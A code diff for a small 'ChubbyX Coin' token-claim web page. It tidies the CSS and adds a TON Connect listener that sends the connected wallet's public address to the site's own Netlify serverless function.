@@ -14,18 +14,9 @@
             text-align: center;
             padding: 50px 20px;
         }
-        h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #aaaaaa;
-            font-size: 16px;
-        }
-        #ton-connect-button {
-            margin-top: 30px;
-            display: inline-block;
-        }
+        h1 { font-size: 28px; margin-bottom: 10px; }
+        p { color: #aaaaaa; font-size: 16px; }
+        #ton-connect-button { margin-top: 30px; display: inline-block; }
     </style>
 </head>
 <body>
@@ -33,7 +24,6 @@
     <h1>ChubbyX Coin</h1>
     <p>Connect your TON wallet to claim your tokens</p>
 
-    <!-- This div will render the Tonkeeper / TON Connect button -->
     <div id="ton-connect-button"></div>
 
     <script>
@@ -41,6 +31,24 @@
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://netlify.app',
             buttonRootId: 'ton-connect-button'
+        });
+
+        // Listen for wallet connection
+        tonConnectUI.onStatusChange(wallet => {
+            if (wallet) {
+                const walletAddress = wallet.account.address;
+                console.log("Wallet Connected:", walletAddress);
+                
+                // Sending the wallet address to Netlify Serverless Function
+                fetch('/.netlify/functions/save-wallet', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: walletAddress })
+                })
+                .then(res => res.json())
+                .then(data => console.log("Response from server:", data))
+                .catch(err => console.error("Error saving wallet:", err));
+            }
         });
     </script>
 </body>
